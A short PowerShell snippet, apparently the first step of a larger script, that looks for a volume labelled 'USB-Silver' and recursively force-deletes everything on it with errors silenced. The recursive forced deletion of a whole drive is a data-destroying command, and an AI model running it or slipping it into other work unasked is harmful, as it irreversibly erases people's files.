# 1. Looking for Harddrive called "USB-Silver"
$target = Get-Volume | Where-Object { $_.FileSystemLabel -eq "USB-Silver" }

if ($target) {
    $driveLetter = $target.DriveLetter + ":"
    Write-Host "[*] Harddrive $driveLetter detected. Wiping Harddrive..." -ForegroundColor Yellow
    Remove-Item "$driveLetter\*" -Recurse -Force -ErrorAction SilentlyContinue
}